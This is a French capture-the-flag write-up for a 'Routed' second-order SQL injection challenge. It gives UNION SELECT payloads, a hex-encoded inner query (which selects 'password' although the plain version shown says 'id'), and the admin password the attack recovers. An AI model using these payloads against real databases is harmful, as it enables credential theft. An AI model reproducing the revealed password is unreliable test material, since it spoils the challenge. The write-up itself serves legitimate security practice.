# Solution CTF SQL Injection - Routed

Les challenges Routed, signifient souvent qu’il y aura une double injection :

Du genre :

a=SELECT username FROM users WHERE username=”…”

	if a not.empty

		SELECT id,email FROM users WHERE username =”a”

Donc d’abord une verification que la personne existe et ensuite la requête

On arrive dans le chall, on voit un onglet intéressant « Search » 

On y trouve un user nommé « admin » :

Results[+] Requested login: admin  
[+] Found ID: 3  
[+] Email: [admin@sqli_me.com](mailto:admin@sqli_me.com)

Donc la requête renvoi son id et son mail

On va déjà faire le payload pour la deuxième requête (celle-ci : SELECT id,email FROM users WHERE username =”a”)

On sait que l’id est 3 pour l’admin donc on écrit : 

‘ UNION SELECT 1,id FROM users WHERE id=3-- -	      (je rajoute un 1 car il faut 2 colonnes)

En HEXA:

2720756e696f6e2073656c65637420312c70617373776f72642066726f6d2075736572732077686572652069643d332d2d202d

Maintenant la première: 

‘ UNION SELECT 0x2720756e696f6e2073656c65637420312c70617373776f72642066726f6d2075736572732077686572652069643d332d2d202d

(On ajoute 0x pour dire que c’est de l’hexa)

 Et hop on a le mdp de l’admin : qs89QdAs9A
